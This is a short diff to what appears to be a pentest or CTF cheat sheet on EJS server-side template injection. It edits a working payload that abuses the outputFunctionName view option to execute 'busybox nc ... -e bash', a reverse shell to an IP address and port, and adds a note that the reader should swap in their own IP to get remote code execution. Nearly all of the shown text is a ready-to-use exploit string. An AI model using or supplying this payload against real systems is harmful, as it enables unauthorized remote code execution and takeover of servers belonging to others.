@@ -22,7 +22,7 @@ https://eslam.io/posts/ejs-server-side-template-injection-rce/?source=post_page-
 # Busybox command
 
 ```
-&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc -e sh 10.4.73.176 1337 -e bash');s
+&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.4.73.176 1337 -e bash');s
 ```
 
 # Changing the ip address to your IP and receive it back > get RCE
